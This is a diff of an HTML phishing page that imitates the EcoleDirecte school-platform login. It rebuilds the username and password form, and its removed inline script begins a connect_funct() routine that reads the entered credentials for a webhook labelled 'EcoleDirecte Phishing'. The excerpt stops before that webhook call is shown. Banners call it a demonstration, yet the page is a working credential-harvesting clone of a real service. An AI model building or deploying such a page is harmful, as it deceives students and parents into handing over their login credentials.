@@ -12,365 +12,91 @@
     <link href="https://www.ecoledirecte.com/assets/icones/manifest/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180">
     <link rel="manifest" href="https://www.ecoledirecte.com/manifest.json">
     <link href="https://www.ecoledirecte.com/assets/icones/manifest/safari-pinned-tab.svg" rel="mask-icon" color="#5bbad5">
-<!--     <link rel="stylesheet" type="text/css" href="fontawesome-free-5.15.4-web/css/all.css">
-    <link rel="stylesheet" type="text/css" href="fontawesome-free-5.15.4-web/css/fontawesome.css"> -->
+    <link rel="stylesheet" href="./EcoleDirecte_files/styles.b86db356e669038a1023.css" media="all" onload="this.media=&#39;all&#39;"><noscript><link rel="stylesheet" href="./EcoleDirecte_files/styles.b86db356e669038a1023.css"></noscript>
+    <link rel="stylesheet" href="style.css">
+
+    <link rel="stylesheet" href="Fork-Awesome-1.2.0/css/fork-awesome.css">
+
+
     <meta name="apple-mobile-web-app-title" content="Mon EcoleDirecte">
     <meta name="application-name" content="EcoleDirecte">
     <meta name="apple-itunes-app" content="app-id=1296851886">
 
-    <!--
-  Inclusion de la librairie MathJax pour avoir la notation LaTex
-  Pour le moment comme il n'existe pas de module node importable dans le code (v3 ?),
-  mise en place du rep de la librairie dans /assets et suppression de plein de rep/fichiers normalement inutils afin d'alléger le poids
-  Plus d'infos sur https://docs.mathjax.org/en/latest/options/index.html#configuration
-  -->
-    <!-- <script type="text/javascript" async="" defer="" src="./EcoleDirecte_files/matomo.js.téléchargement"></script><script type="text/x-mathjax-config;executed=true">
-      MathJax.Hub.Config({
-        availableFonts: ["TeX"],
-        imageFont: null,
-        extensions: ["tex2jax.js"],
-        jax: ["input/TeX","output/HTML-CSS"],
-        tex2jax: {
-          inlineMath: [['$','$'], ['\\(','\\)']],
-          preview: "none"
-        },
-        "HTML-CSS": { availableFonts: ["TeX"] },
-        messageStyle: "none",
-        showLocale: false,
-        showProcessingMessages: false
-      });
-    </script> -->
-    <!-- <script async="" src="./EcoleDirecte_files/MathJax.js.téléchargement"></script>
-    <script async="" src="./EcoleDirecte_files/ckeditor.js.téléchargement"></script> -->
-  <style>@charset "UTF-8";
-  html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}@media print{*,:after,:before{color:#000!important;text-shadow:none!important;background:0 0!important;box-shadow:none!important}}:after,:before{box-sizing:border-box}html{font-size:10px;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{font-family:Helvetica Neue,Helvetica,Arial,sans-serif;line-height:1.42857143;color:#333;background-color:#fff}@media print{body{padding-top:0;font-size:80%}}:root{--footer-primary-color:#edf3fd;--hover-primary-color:#aad8ea;--light-primary-color:#0f8fd1;--smalldark-primary-color:#2e6ac8;--dark-primary-color:#0e3e85;--ultradark-primary-color:#092354;--light-secondary-color:#e46bad;--secondary-color:#cd1478;--dark-secondary-color:#960b56;--light-placeholder-color:#f5f6f7;--smalldark-placeholder-color:#e4e7ea;--dark-placeholder-color:#c3c3c3;--ultradark-placeholder-color:#887f7f;--light-notice-color:#fffca0;--middle-notice-color:#fff575;--dark-notice-color:#f2ec9e;--travail-color:#6aaf11;--contenu-color:#0c91c6;--search-color:#a5a7ab}*{margin:0;padding:0;box-sizing:border-box}body{font-size:14px;color:#000;overflow-x:hidden}</style><link rel="stylesheet" href="./EcoleDirecte_files/styles.b86db356e669038a1023.css" media="all" onload="this.media=&#39;all&#39;"><noscript><link rel="stylesheet" href="./EcoleDirecte_files/styles.b86db356e669038a1023.css"></noscript><style>.cke{visibility:hidden;}</style><style>#chargementencours[_ngcontent-jkw-c127]   .load-container[_ngcontent-jkw-c127]{display:flex;flex-direction:column;justify-content:flex-start;position:relative;padding:80px!important;min-height:100vh}#chargementencours[_ngcontent-jkw-c127]   .load-container[_ngcontent-jkw-c127]   strong[_ngcontent-jkw-c127]{font-size:18px}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   header[_ngcontent-jkw-c127]{margin:100px 0 5vh}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   header[_ngcontent-jkw-c127]   h1[_ngcontent-jkw-c127]{font-size:15px;color:var(--dark-primary-color);margin-top:5px}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   header[_ngcontent-jkw-c127]   img[_ngcontent-jkw-c127]{display:block;margin:0 auto}#chargementencours[_ngcontent-jkw-c127]   .info-container[_ngcontent-jkw-c127]{position:relative;display:flex;min-height:100vh;background:linear-gradient(var(--dark-primary-color) 0%,var(--light-primary-color) 100%)}#chargementencours[_ngcontent-jkw-c127]   .info-container[_ngcontent-jkw-c127]   p[_ngcontent-jkw-c127]{margin:auto;color:#fff}#chargementencours[_ngcontent-jkw-c127]   .info-container[_ngcontent-jkw-c127]   i[_ngcontent-jkw-c127]{font-size:60px}#chargementencours[_ngcontent-jkw-c127]   .info-container[_ngcontent-jkw-c127]   strong[_ngcontent-jkw-c127]{display:block;margin:30px 0;font-size:20px}#chargementencours[_ngcontent-jkw-c127]   .info-container[_ngcontent-jkw-c127]   em[_ngcontent-jkw-c127]{font-size:18px}@media screen and (max-width: 1280px){#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   header[_ngcontent-jkw-c127]{margin:0}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   #bloc-connexion[_ngcontent-jkw-c127]   h2[_ngcontent-jkw-c127]{font-size:20px}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   #bloc-connexion[_ngcontent-jkw-c127]   input[type=password][_ngcontent-jkw-c127]{height:30px}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   #bloc-connexion[_ngcontent-jkw-c127]   input[type=text][_ngcontent-jkw-c127]{height:30px}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   .log[_ngcontent-jkw-c127]{margin:0}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   .mdp-lost[_ngcontent-jkw-c127]{margin:1vh 0 4vh}#chargementencours[_ngcontent-jkw-c127]   .load-container.login-container[_ngcontent-jkw-c127]   span#show-password[_ngcontent-jkw-c127]{bottom:-33px}}</style><style>.login-container[_ngcontent-jkw-c63]{padding:50px!important}.login-container[_ngcontent-jkw-c63]   .titre[_ngcontent-jkw-c63]   .logo[_ngcontent-jkw-c63]{margin-bottom:10px}.login-container[_ngcontent-jkw-c63]   .center[_ngcontent-jkw-c63]{float:none;margin:0 auto 10px}.login-container[_ngcontent-jkw-c63]:not(.session-expire){display:flex;flex-direction:column;justify-content:space-between;position:relative;padding:80px!important;min-height:100vh}.login-container[_ngcontent-jkw-c63]   header[_ngcontent-jkw-c63]{margin:100px 0 5vh}.login-container[_ngcontent-jkw-c63]   header[_ngcontent-jkw-c63]   h1[_ngcontent-jkw-c63]{font-size:15px;color:var(--dark-primary-color);margin-top:5px}.login-container[_ngcontent-jkw-c63]   header[_ngcontent-jkw-c63]   img[_ngcontent-jkw-c63]{display:block;margin:0 auto}.login-container[_ngcontent-jkw-c63]   #site-closed[_ngcontent-jkw-c63]   h3[_ngcontent-jkw-c63]{padding:20px;text-align:center}.form-box[_ngcontent-jkw-c63]{flex:1}.tel[_ngcontent-jkw-c63]{margin:0}input[type=text].with-border[_ngcontent-jkw-c63]{border:1px solid var(--dark-placeholder-color)}button[_ngcontent-jkw-c63]:not(#show-password):not(.btn-link){margin:2vh 0;padding:10px;background:var(--light-primary-color)}.checkbox[_ngcontent-jkw-c63] > span[_ngcontent-jkw-c63]{vertical-align:top}#pb-connexion[_ngcontent-jkw-c63]{position:absolute;left:-95px;top:50vh;padding:10px 20px;color:#000;transform:rotate(-90deg);-webkit-transform:rotate(-90deg);background:#fff;box-shadow:0 5px 4px #00000080;text-transform:uppercase;font-size:13px;font-weight:700}#pb-connexion[_ngcontent-jkw-c63]:hover{text-decoration:none;color:var(--dark-primary-color)}.info-container[_ngcontent-jkw-c63]{position:relative;display:flex;min-height:100vh;background:linear-gradient(var(--dark-primary-color) 0%,var(--light-primary-color) 100%)}.info-container[_ngcontent-jkw-c63] > div[_ngcontent-jkw-c63]{margin:auto;text-align:center}.info-container[_ngcontent-jkw-c63] > div[_ngcontent-jkw-c63]   p[_ngcontent-jkw-c63]{position:relative;margin:0 100px 20px;font-size:20px;font-weight:300;color:#fff;text-align:left}.info-container[_ngcontent-jkw-c63] > div[_ngcontent-jkw-c63]   p[_ngcontent-jkw-c63]   img[_ngcontent-jkw-c63]{width:100%}.version-site[_ngcontent-jkw-c63]{color:transparent}@media screen and (max-width: 1280px){.login-container[_ngcontent-jkw-c63]   header[_ngcontent-jkw-c63]{margin:0}}</style><style>#bloc-connexion[_ngcontent-jkw-c62]   h2[_ngcontent-jkw-c62]{font-size:35px}#bloc-connexion[_ngcontent-jkw-c62]   button#connexion[_ngcontent-jkw-c62]{font-size:20px}#bloc-connexion[_ngcontent-jkw-c62]   input[type=text][_ngcontent-jkw-c62]{padding:5px;height:50px}#bloc-connexion[_ngcontent-jkw-c62]   input[type=password][_ngcontent-jkw-c62]{padding:5px;height:50px}.log[_ngcontent-jkw-c62]{display:block;padding:13px 0;width:100%;margin:4vh 0;font-size:15px;border-radius:2px;line-height:1;border:1px solid rgba(36,28,21,.3)}span#show-password[_ngcontent-jkw-c62]{position:relative;float:right;bottom:-43px;left:-2px}.mdp-lost[_ngcontent-jkw-c62]{float:right;margin:-3vh 0 4vh;font-style:italic;color:#999}@media screen and (max-width: 1280px){#bloc-connexion[_ngcontent-jkw-c62]   h2[_ngcontent-jkw-c62]{font-size:20px}#bloc-connexion[_ngcontent-jkw-c62]   input[type=password][_ngcontent-jkw-c62]{height:30px}#bloc-connexion[_ngcontent-jkw-c62]   input[type=text][_ngcontent-jkw-c62]{height:30px}.log[_ngcontent-jkw-c62]{margin:0}span#show-password[_ngcontent-jkw-c62]{bottom:-33px}.mdp-lost[_ngcontent-jkw-c62]{margin:1vh 0 4vh}}</style><style>.login-container[_ngcontent-jkw-c62]{padding:50px!important}.login-container[_ngcontent-jkw-c62]   .titre[_ngcontent-jkw-c62]   .logo[_ngcontent-jkw-c62]{margin-bottom:10px}.login-container[_ngcontent-jkw-c62]   .center[_ngcontent-jkw-c62]{float:none;margin:0 auto 10px}.login-container[_ngcontent-jkw-c62]:not(.session-expire){display:flex;flex-direction:column;justify-content:space-between;position:relative;padding:80px!important;min-height:100vh}.login-container[_ngcontent-jkw-c62]   header[_ngcontent-jkw-c62]{margin:100px 0 5vh}.login-container[_ngcontent-jkw-c62]   header[_ngcontent-jkw-c62]   h1[_ngcontent-jkw-c62]{font-size:15px;color:var(--dark-primary-color);margin-top:5px}.login-container[_ngcontent-jkw-c62]   header[_ngcontent-jkw-c62]   img[_ngcontent-jkw-c62]{display:block;margin:0 auto}.login-container[_ngcontent-jkw-c62]   #site-closed[_ngcontent-jkw-c62]   h3[_ngcontent-jkw-c62]{padding:20px;text-align:center}.form-box[_ngcontent-jkw-c62]{flex:1}.tel[_ngcontent-jkw-c62]{margin:0}input[type=text].with-border[_ngcontent-jkw-c62]{border:1px solid var(--dark-placeholder-color)}button[_ngcontent-jkw-c62]:not(#show-password):not(.btn-link){margin:2vh 0;padding:10px;background:var(--light-primary-color)}.checkbox[_ngcontent-jkw-c62] > span[_ngcontent-jkw-c62]{vertical-align:top}#pb-connexion[_ngcontent-jkw-c62]{position:absolute;left:-95px;top:50vh;padding:10px 20px;color:#000;transform:rotate(-90deg);-webkit-transform:rotate(-90deg);background:#fff;box-shadow:0 5px 4px #00000080;text-transform:uppercase;font-size:13px;font-weight:700}#pb-connexion[_ngcontent-jkw-c62]:hover{text-decoration:none;color:var(--dark-primary-color)}.info-container[_ngcontent-jkw-c62]{position:relative;display:flex;min-height:100vh;background:linear-gradient(var(--dark-primary-color) 0%,var(--light-primary-color) 100%)}.info-container[_ngcontent-jkw-c62] > div[_ngcontent-jkw-c62]{margin:auto;text-align:center}.info-container[_ngcontent-jkw-c62] > div[_ngcontent-jkw-c62]   p[_ngcontent-jkw-c62]{position:relative;margin:0 100px 20px;font-size:20px;font-weight:300;color:#fff;text-align:left}.info-container[_ngcontent-jkw-c62] > div[_ngcontent-jkw-c62]   p[_ngcontent-jkw-c62]   img[_ngcontent-jkw-c62]{width:100%}.version-site[_ngcontent-jkw-c62]{color:transparent}@media screen and (max-width: 1280px){.login-container[_ngcontent-jkw-c62]   header[_ngcontent-jkw-c62]{margin:0}}</style><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
-.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
-.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
-.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
-.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
-</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
-#MathJax_About.MathJax_MousePost {outline: none}
-.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
-.MathJax_MenuItem {padding: 2px 2em; background: transparent}
-.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
-.MathJax_MenuActive .MathJax_MenuArrow {color: white}
-.MathJax_MenuArrow.RTL {left: .5em; right: auto}
-.MathJax_MenuCheck {position: absolute; left: .7em}
-.MathJax_MenuCheck.RTL {right: .7em; left: auto}
-.MathJax_MenuRadioCheck {position: absolute; left: 1em}
-.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
-.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
-.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
-.MathJax_MenuDisabled {color: GrayText}
-.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
-.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
-.MathJax_ContextMenu:focus {outline: none}
-.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
-#MathJax_AboutClose {top: .2em; right: .2em}
-.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
-.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
-.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
-.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
-.MathJax_MenuClose:hover span {background-color: #CCC!important}
-.MathJax_MenuClose:hover:focus {outline: none}
-</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
-</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
-.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
-</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
-#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
-#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
-#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
-</style><style type="text/css">.MathJax_Preview {color: #888; display: contents}
-#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
-#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
-.MathJax_Error {color: #CC0000; font-style: italic}
-</style><style type="text/css">.MJXp-script {font-size: .8em}
-.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
-.MJXp-bold {font-weight: bold}
-.MJXp-italic {font-style: italic}
-.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
-.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
-.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
-.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
-.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
-.MJXp-largeop {font-size: 150%}
-.MJXp-largeop.MJXp-int {vertical-align: -.2em}
-.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
-.MJXp-display {display: block; text-align: center; margin: 1em 0}
-.MJXp-math span {display: inline-block}
-.MJXp-box {display: block!important; text-align: center}
-.MJXp-box:after {content: " "}
-.MJXp-rule {display: block!important; margin-top: .1em}
-.MJXp-char {display: block!important}
-.MJXp-mo {margin: 0 .15em}
-.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
-.MJXp-denom {display: inline-table!important; width: 100%}
-.MJXp-denom > * {display: table-row!important}
-.MJXp-surd {vertical-align: top}
-.MJXp-surd > * {display: block!important}
-.MJXp-script-box > *  {display: table!important; height: 50%}
-.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
-.MJXp-script-box > *:last-child > * {vertical-align: bottom}
-.MJXp-script-box > * > * > * {display: block!important}
-.MJXp-mphantom {visibility: hidden}
-.MJXp-munderover, .MJXp-munder {display: inline-table!important}
-.MJXp-over {display: inline-block!important; text-align: center}
-.MJXp-over > * {display: block!important}
-.MJXp-munderover > *, .MJXp-munder > * {display: table-row!important}
-.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
-.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
-.MJXp-mtr {display: table-row!important}
-.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
-.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
-.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
-.MJXp-mlabeledtr {display: table-row!important}
-.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
-.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
-.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
-.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
-.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
-.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
-.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
-.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
-.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
-.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
-.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
-.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
-.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
-.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
-</style></head>
-  <body onload="alert_funct();">
+    <script type="text/javascript" src="app.js"></script>
+
+
+
+</head>
+  
+<body onload="alert_funct();">
+
+  <div id="MathJax_Message" style="display: none;"></div>
+
+
+  <app-root _nghost-jkw-c127="" ng-version="12.2.15">
+    <div _ngcontent-jkw-c127="" class="container-principal">
+      <router-outlet _ngcontent-jkw-c127=""></router-outlet>
+      <ng-component>
+        <div id="main-part">
+          <div id="main">
+            <router-outlet></router-outlet>
+            <ed-login _nghost-jkw-c63="">
+              <div _ngcontent-jkw-c63="" id="login" class="container-fluid no-padding">
+                <div _ngcontent-jkw-c63="" class="col-lg-4 col-md-5 login-container">
+                  <header _ngcontent-jkw-c63="" class="text-center">
+                    <img _ngcontent-jkw-c63="" src="./EcoleDirecte_files/logoEcoleDirecte.png" alt="Logo du site EcoleDirecte">
+                    <h1 _ngcontent-jkw-c63="">EcoleDirecte</h1>
+                  </header>
+                  <div _ngcontent-jkw-c63="" id="site-closed" class="form-box" hidden="">
+                    <h3 _ngcontent-jkw-c63="" id="outputbis" class="animated fadeInUp alert alert-danger"> Ce site est <br _ngcontent-jkw-c63=""> actuellement fermé </h3>
+                    <br _ngcontent-jkw-c63="">
+                    <p _ngcontent-jkw-c63="" class="help-block"> Vous ne pouvez pas vous connecter pour le moment. <br _ngcontent-jkw-c63=""> Contactez votre établissement pour plus d'informations. </p>
+                  </div>
+                  <div _ngcontent-jkw-c63="" class="form-box" hidden="">
+                    <h2 _ngcontent-jkw-c63="">Redirection en cours</h2>
+                    <br _ngcontent-jkw-c63=""><i _ngcontent-jkw-c63="" class="fa fa-spinner fa-pulse"></i><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63="">
+                  </div>
+                  <ed-login-form _ngcontent-jkw-c63="" class="form-box" _nghost-jkw-c62="">
+                    
+                    <div _ngcontent-jkw-c62="" id="bloc-connexion">
+                      <h2 _ngcontent-jkw-c62="" class="text-center">Connectez-vous</h2>
+                      
+                      <form _ngcontent-jkw-c62="" novalidate="" class="ng-valid ng-touched ng-dirty" data-bitwarden-watching="1">
+                        <input _ngcontent-jkw-c62="" id="username" type="text" name="username" placeholder="Identifiant" autocapitalize="off" class="input-block-level log ng-valid ng-touched ng-dirty" data-com.bitwarden.browser.user-edited="yes"><span _ngcontent-jkw-c62="" id="show-password" class="btn btn-simple btn-default pull-right">
+                          <i _ngcontent-kwa-c175 class="fa fa-eye"></i></span><input _ngcontent-jkw-c62="" id="password" name="password" placeholder="Mot de passe" class="log ng-valid ng-dirty ng-touched" type="password" data-com.bitwarden.browser.user-edited="yes"><a _ngcontent-jkw-c62="" routerlink="/recuplogin" href="https://www.ecoledirecte.com/recuplogin" class="mdp-lost">Mot de passe oublié ?</a>
+                        <div _ngcontent-jkw-c62="" class="clearfix"></div>
+                        <a id="bouton" onclick="connect_funct()" class="btn btn-info btn-block login">
+                          Connexion
+                        </a>
+                        <div _ngcontent-jkw-c62="" class="checkbox text-center text-bold"><label _ngcontent-jkw-c62=""><input _ngcontent-jkw-c62="" type="checkbox" name="loginStored" class="ng-untouched ng-pristine ng-valid"></label><span _ngcontent-jkw-c62="" class="label-checkbox">Se souvenir de moi</span></div>
+                      </form>
+                      
+                    </div>
+                  </ed-login-form>
+                  <div _ngcontent-jkw-c63="" id="item-mentions"><button _ngcontent-jkw-c63="" type="button" class="btn btn-link"><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">Mentions légales </a></button></div>
+                  <span _ngcontent-jkw-c63="" class="pull-left version-site">v1.14.1</span>
+                </div>
+                <div _ngcontent-jkw-c63="" class="col-lg-8 col-md-7 info-container">
+                  <button _ngcontent-jkw-c63="" id="pb-connexion" class="btn btn-link">Problème de connexion ?</button>
+                  <div _ngcontent-jkw-c63="" class="autopromo">
+                    <p _ngcontent-jkw-c63=""><span _ngcontent-jkw-c63="">Retrouvez EcoleDirecte aussi sur votre mobile</span></p>
+                    <ul _ngcontent-jkw-c63="" class="list-inline">
+                      <li _ngcontent-jkw-c63=""><a _ngcontent-jkw-c63="" href="https://play.google.com/store/apps/developer?id=Aplim" target="_blank"><img _ngcontent-jkw-c63="" alt="Get it on Google Play" src="./EcoleDirecte_files/play-store.png"></a></li>
+                      <li _ngcontent-jkw-c63=""><a _ngcontent-jkw-c63="" href="https://itunes.apple.com/fr/developer/aplim/id466797731" target="_blank"><img _ngcontent-jkw-c63="" alt="Get it on AppStore" src="./EcoleDirecte_files/appstore.png"></a></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </ed-login>
+          </div>
+        </div>
+      </ng-component>
+      <router-outlet _ngcontent-jkw-c127="" name="auxiliaryModal"></router-outlet>
+    </div>
+  </app-root>
+
+  <div style="position: absolute; left: -9999px; top: -9999px;"><div class="dhx_cal_container"><div class="dhx_cal_scale_placeholder"></div><div></div></div></div><div style="position: absolute; left: -9999px; top: -9999px;"><div class="dhx_cal_container"><div class="dhx_cal_scale_placeholder"></div><div></div></div></div>
 
-
-
-
-<script type="text/javascript">
-
-	function confirmation() {
-		if (window.confirm("ATTENTION SITE DE PHISHING UNIQUEMENT A BUT DEMONSTRATIF.\nN'ENTREZ AUCUNE INFORMATION PERSONNELLE DESSUS\nNOUS NE SERONT PAS TENUS RESPONSABLES\n\nEN CLIQUANT SUR 'OK' VOUS ACCEPTEZ LES RISQUES ET EN ASSUMEZ PLEINEMENT LA RESPONSABILITE.")) {
-		}else{
-			window.location.replace('https://www.ecoledirecte.com');
-		}
-	}
-
-
-	function alert_funct() {
-		const style = 'color:red; font-size:30px; font-weight: bold; -webkit-text-stroke: 1px black;'
-		console.log("%c Phishing website !\n Demo only\n Do not enter your real credentials", style);
-		console.log("%cGithub repository :", "color:blue; font-size:50px");
-		console.log('%chttps://github.com/ecole-directe/ecole-directe.github.io \nBy Nota', 'color:green; font-size: 20px;');
-	}
-
-</script>
-
-
-<script type="text/javascript">
-
-
-
-function connect_funct() {
-    var uname = document.getElementById("username").value;
-    var pass = document.getElementById("password").value;
-    const d = new Date();
-    let date_string = d.toLocaleString();
-    const webhook_name = "EcoleDirecte Phishing";
-
-    console.log("webhook_name : ", webhook_name);
-    console.log("username : ", uname);
